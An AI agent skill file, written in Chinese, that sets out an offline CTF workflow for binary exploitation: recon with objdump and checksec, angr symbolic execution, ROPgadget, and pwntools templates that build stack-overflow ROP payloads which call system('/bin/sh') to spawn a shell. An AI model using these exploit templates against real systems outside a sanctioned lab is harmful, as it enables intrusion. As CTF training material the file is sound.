---
name: binary
description: triggers: BINARY, 二进制, binary漏洞, 逆向, 缓冲区溢出, fuzzing, pwntools, angr, ghidra, rop, 堆漏洞, 栈溢出, 格式化字符串
---

# BINARY 二进制漏洞挖掘 — CTF 自动化工作流

**运行环境: 离线靶场，禁止外网。所有工具本地安装，禁止 web_search/fetch_url 下载。**

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| pwntools | `pip install pwntools`（已装） | 漏洞利用框架 |
| angr | `pip install angr`（已装） | 符号执行/自动求解 |
| ROPgadget | `pip install ROPgadget`（已装） | ROP 链生成 |
| Python | `D:/Scoop/apps/python/current/python.exe` | 脚本执行 |

> 注：Ghidra/radare2/gdb 未预装，优先用 pwntools + objdump + strings + angr 组合。

## 工作流：五阶段推进

### 阶段 1: 初步侦察 Recon

```bash
# 1a. 文件类型
file <binary>
strings <binary> | head -100

# 1b. 防护检测（pwntools checksec）
python -c "from pwn import *; e=ELF('<binary>'); print(f'Arch: {e.arch}, PIE: {e.pie}, NX: {e.nx}, RELRO: {e.relro}, Canary: {e.canary}')"

# 1c. 符号表 + 反汇编
objdump -T <binary> 2>/dev/null
objdump -d <binary> | head -200
```

### 阶段 2: 静态分析 Static

```bash
# 2a. 危险函数搜索
strings <binary> | grep -E "flag|password|secret|key|admin"
objdump -d <binary> | grep -E "gets|scanf|strcpy|sprintf|system|execve|read"

# 2b. 函数列表
objdump -t <binary> | grep "F .text" | head -50
nm <binary> 2>/dev/null | grep " T "
```

### 阶段 3: 符号执行 Symbolic

```bash
# 3a. angr 自动找 flag 路径
python << 'EOF'
import angr
proj = angr.Project('<binary>', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=lambda s: b"flag" in s.posix.dumps(1) or b"Correct" in s.posix.dumps(1))
if simgr.found:
    print("Found! Input:", simgr.found[0].posix.dumps(0))
EOF

# 3b. 找特定地址
python -c "
import angr
proj = angr.Project('<binary>', auto_load_libs=False)
simgr = proj.factory.simulation_manager()
simgr.explore(find=0x<TARGET_ADDR>, avoid=0x<AVOID_ADDR>)
if simgr.found: print('Path found:', simgr.found[0].posix.dumps(0))
"
```

### 阶段 4: 利用构造 Exploit

```bash
# 4a. ROPgadget
ROPgadget --binary <binary> --ropchain
ROPgadget --binary <binary> | grep "pop rdi"
ROPgadget --binary <binary> | grep "ret"

# 4b. pwntools exp 模板
python << 'EOF'
from pwn import *
context.arch = 'amd64'  # 根据实际架构调整
context.log_level = 'debug'

elf = ELF('./binary')
# p = process('./binary')
p = remote('<host>', <port>)

# 找 offset: 先用 pattern_create 200 生成输入，crash 后用 pattern_offset 查
# 构造 payload
offset = <N>
pop_rdi = <gadget_addr>
binsh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']

payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
EOF
```

### 阶段 5: 记录 Findings

用 findings skill 记录：漏洞类型、防护绕过情况、利用方式、证据。

## 命令模板速查

### pwntools 快速模板

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./binary')  # 本地
# p = remote('host', port)  # 远程

elf = ELF('./binary')
# libc = ELF('./libc.so.6')

payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(next(elf.search(b'/bin/sh')))
payload += p64(elf.plt['system'])

p.sendline(payload)
p.interactive()
```

## 判定规则

1. **无 Canary + 栈溢出** → 可直接 ROP，Critical
2. **无 PIE + 危险函数** → 地址固定，High
3. **angr 找到 flag** → 直接记录
4. **有 system + /bin/sh** → ret2libc 直用

## 离线环境

- 禁止 web_search/fetch_url
- 优先用 pwntools + objdump + strings + angr
- Ghidra/radare2 未预装，不依赖